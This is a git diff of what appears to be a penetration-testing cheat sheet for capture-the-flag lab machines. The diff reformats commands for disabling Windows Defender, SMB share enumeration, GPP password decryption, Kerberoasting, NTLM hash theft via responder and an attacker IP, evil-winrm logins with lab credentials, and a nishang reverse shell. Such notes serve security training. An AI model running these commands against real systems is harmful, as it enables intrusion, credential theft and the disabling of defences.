@@ -20,59 +20,59 @@ dnsrecon -d 10.10.10.100 -r 10.0.0.0/8
 ## Windows
 
 //enumerate folders  in powershell
-gci -recurse . | select fullname
+```gci -recurse . | select fullname```
 
 //Disable defender real time scan
-Set-MpPreference -DisableRealtimeMonitoring $true
+```Set-MpPreference -DisableRealtimeMonitoring $true```
 
 
 ## Linux
 
 # Web
-gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```
 
 ### NFS
-showmount -e 10.10.10.34
+```showmount -e 10.10.10.34```
 
 
 LFI
 https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/
 
 
-SMB
+### SMB
 #anonymous share access
-smbmap -u anonymous -H ip
+```smbmap -u anonymous -H ip```
 # recursive all with depth
-smbmap -u anonymous -H 10.10.10.130 -r --depth 5
-smbmap -u USER -p PASSWORD -d DOMAIN -H ip
+```smbmap -u anonymous -H 10.10.10.130 -r --depth 5```
+```smbmap -u USER -p PASSWORD -d DOMAIN -H ip```
 # recursively list share contents
-smbmap -R dirname -H ip
+```smbmap -R dirname -H ip```
 # download file with certain name
-smbmap -R dirname -H ip -A Groups.xml
+```smbmap -R dirname -H ip -A Groups.xml```
 # list shares with creds
-smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100
+```smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100```
 # decrypt gpp password, cpassword comes from group xml
-gpp-decrypt "cpassword"
+```gpp-decrypt "cpassword"```
 # Get AD users after having user creds
-GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs  # unicode errors see https://github.com/SecureAuthCorp/impacket/issues/632
+```GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs  # unicode errors see https://github.com/SecureAuthCorp/impacket/issues/632```
 # Get user spn # https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names !!! FIX TIME SKEW
-GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
-smbclient -L //10.10.10.100   (enter if password is requested)
-smbclient -U anonymous  //10.10.10.130/batshare
+```GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs```
+```smbclient -L //10.10.10.100   (enter if password is requested)```
+```smbclient -U anonymous  //10.10.10.130/batshare```
 
 # steal smbhash when having a shell
 ## victim
-responder -I tun0
+```responder -I tun0```
 ## attacker
-get-content \\10.10.14.73\blablabla
+```get-content \\10.10.14.73\blablabla```
 # get user hahses 
-GetNPUsers.py DOMAIN/ -usersfile ausers.txt
+```GetNPUsers.py DOMAIN/ -usersfile ausers.txt```
 
-evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
+```evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'```
 
 SHELLS
-cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
-psexec.py  'user:pass@localhost' cmd
+```cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .```
+```psexec.py  'user:pass@localhost' cmd ```
 
 ENUMERATION
 
